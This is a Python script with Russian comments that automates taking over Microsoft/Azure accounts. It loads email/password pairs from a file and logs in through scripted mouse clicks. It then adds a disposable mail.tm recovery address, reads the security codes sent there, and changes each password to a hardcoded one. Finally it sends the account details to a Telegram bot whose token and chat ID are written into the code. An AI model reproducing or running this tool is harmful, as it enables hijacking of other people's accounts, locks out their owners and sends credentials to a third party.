import keyboard, random
from pyautogui import*
from tqdm import tqdm
import requests, time
from datetime import*
from keyboard import*
import time
from mailtm import*
def listener(message):
    global subject; global text
    print("\nSubject: " + message['subject'])
    print("Content: " + message['text'] if message['text'] else message['html'])
    security_code = "Content: " + message['text'] if message['text'] else message['html']
    subject = "\nSubject: " + message['subject']
    text = message['text']
    print('это сек код тест', text) #api почта функция
subject = str();
text = str()
print('На данный момент использовать только под почту "Microsoft" ! \n'
      'Также убедись, что подгрузил файл с акками и айпишками в "accs_gruzit_pod_rdp.txt"')
accs_file_inf = open('accs_gruzit_pod_rdp.txt')
data_of_accs_inf = accs_file_inf.read()
list_of_accs_inf = data_of_accs_inf.split('\n')

response = requests.get('https://api.ipify.org')
ip_address = response.text
print(f'Your IP Address is {ip_address}')
for i in range(len(list_of_accs_inf)):
    if ip_address in list_of_accs_inf[i]:
        account_email = list_of_accs_inf[i][:list_of_accs_inf[i].find('\t')]
        account_password = list_of_accs_inf[i][list_of_accs_inf[i].find('\t') + 1:list_of_accs_inf[i].rfind('\t')]
        stroka_acca = list_of_accs_inf[i]
        print('Аккаунт найден:', list_of_accs_inf[i], ' - положение в таблице || \n')
        print('Текущая выдача данных: ', account_email, account_password, ip_address, '|| Сверка пройдена!')
        print('Даю время на валидацию и начинаю... (30 seconds)');
        break
for i in tqdm(range(100)):
    time.sleep(0.3)
click(1018, 770, 1, 0, 'left'); sleep(3); click(1018, 770, 1, 0, 'left'); sleep(3); click(693, 714, 1, 0, 'left'); sleep(3) # завершаем настройку хрома
click(981, 27, 1, 0, 'left'); sleep(3) # хром на полный экран
click(172, 58, 1, 0, 'left'); keyboard.write('azure.microsoft.com', 0,1); keyboard.send('enter'); sleep(12) # ввод azure.microsoft.com
click(1153, 184, 1, 0, 'left'); sleep(10) # sign in
click(475, 414, 1, 0, 'left'); keyboard.write(account_email, delay=0.2); sleep(1); click(720, 538, 1, 0, 'left'); sleep(3) # email input
click(475, 482, 1, 0, 'left'); keyboard.write(account_password, delay=0.2); sleep(1); click(717, 606, 1, 0, 'left'); sleep(5) # password input
click(1020, 366, 1, 0, 'left') # отменить сохранение данных лог пасса
sleep(2); click(719, 596, 1, 0, 'left'); sleep(15) # password save and stay sign in
click(1076, 107, 1, 0, 'left'); sleep(8); click(1058, 249, 1, 0, 'left'); sleep(12); click(713, 768, 1, 0, 'left'); sleep(30); # переходим в настройки акка из
# панели азура
click(880, 332, 1, 0, 'left'); click(880, 250, 1, 0, 'left'); click(880, 275, 1, 0, 'left'); click(880, 335, 1, 0, 'left'); sleep(8) # нажимаем изменить пасс кнопку
click(454, 567, 1, 0, 'left'); sleep(4);
# Get Domains # НАЧИНАЕМ ЮЗАТЬ ПОЧТУ ПОД АКК
test = Email()
print("\nDomain: " + test.domain)
# Make new email address
test.register(username=None, password='1534589', domain=None)
print("\nEmail Adress: " + str(test.address))
email_reserve = test.address; sleep(3)
keyboard.write(email_reserve, delay=0.1); sleep(2); click(722, 674, 1, 0, 'left'); # вводим резерв почту и нажимаем ок
# Start listening
test.start(listener, interval=3)
print("\nWaiting for new emails...")
time.sleep(25)
print(text, 'проверка на наличие кода')
test.stop()
list_of_text = text.split('\n')
for i in range(len(list_of_text)):
    if 'Security code' in list_of_text[i]:
            security_code = list_of_text[i]
security_code_ready = str()
for i in range(len(security_code)):
    if security_code[i].isdigit():
        security_code_ready += security_code[i]
print(security_code_ready)
sleep(5); click(440, 480, 1, 0, 'left'); keyboard.write(security_code_ready, delay=0.2); sleep(2); click(721, 604, 1, 0, 'left'); sleep(15) # вводим секьюрити код 1
click(538, 452, 1, 0, 'left'); sleep(6) # подтвердить для ввода резерва и второго кода доступа
click(505, 505, 1, 0, 'left'); keyboard.write(email_reserve, delay=0.1); click(718, 594, 1, 0, 'left'); sleep(4) # вводим почту 2ой раз
security_code = ''; security_code_ready = ''; text = ''; subject = ''
# Start listening ПОЛУЧАЕМ КОД
test.start(listener, interval=3)
print("\nWaiting for new emails...")
time.sleep(25)
print(text, 'проверка на наличие кода')
test.stop()
list_of_text = text.split('\n')
for i in range(len(list_of_text)):
    if 'Security code' in list_of_text[i]:
            security_code = list_of_text[i]
security_code_ready = str()
for i in range(len(security_code)):
    if security_code[i].isdigit():
        security_code_ready += security_code[i]

click(444, 504, 1, 0, 'left'); keyboard.write(security_code_ready, delay=0.2); sleep(2); click(711, 598, 1, 0, 'left'); sleep(10) # вводим секьюрити код 2
click(447, 605, 1, 0, 'left'); sleep(8) # отказываемся от доп защиты с пассом
click(97, 297, 1, 0, 'left'); keyboard.write(account_password, delay=0.1); sleep(1.5) # вводим старый пасс
click(88, 388, 1, 0, 'left'); keyboard.write('56981488228Simak', delay=0.1); sleep(1.5) # вводим новый пасс 1
click(102, 489, 1, 0, 'left'); keyboard.write('56981488228Simak', delay=0.1); sleep(1.5) # вводим новый пасс 2
click(110, 629, 1, 0, 'left'); sleep(15) # подтверждаем изменение пасса
click(718, 629, 1, 0, 'left'); sleep(7); sleep(3)
click(451, 460, 1, 0, 'left'); sleep(1); keyboard.write('56981488228Simak', delay=0.2); sleep(2.5); click(717, 622, 1, 0, 'left'); sleep(15) # перелогин на случай краша страницы
click(1010, 362, 1, 0, 'left'); click(806, 142, 1, 0, 'left'); sleep(11) # закрываем еще одно окно навязывания хуйни для защиты
click(717, 621, 1, 0, 'left'); sleep(15); # переходим в секьюрити
scroll(-3200); sleep(2); click(123, 725, 1, 0, 'left'); sleep(7); click(491, 551, 1, 0, 'left'); sleep(2) # скролим вниз и генерим новый код и подтверждаем
click(132, 17, 1, 0, 'left'); sleep(2); click(224, 234, 1, 0, 'left'); sleep(7); click(116, 105, 1, 0, 'left'); # обновляем страничку азур путем кликами по иконкам :)
################# ОТПРАВЛЕНИЕ ДАННЫХ В ТГ БОТ BOTINOK
TOKEN = "6619003611:AAGRivvPR1q5XZbnNh0RgZ5Y86_FBlpkTOE"
now_time = str(datetime.now())
chat_id = '506640934'
message ='===================\n' + '[RDP] POSTAVIL NA ACC: \n' + stroka_acca + '\n' +  now_time + '\n' +  email_reserve + '===================\n'
url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={message}"
print(requests.get(url).json()) # Эта строка отсылает сообщение
##################
print('ГОТОВО. АККАУНТ ЗАПРИВАЧЕН)\n\n'
      'резервная почта аккаунта:', email_reserve)
sleep(7200)
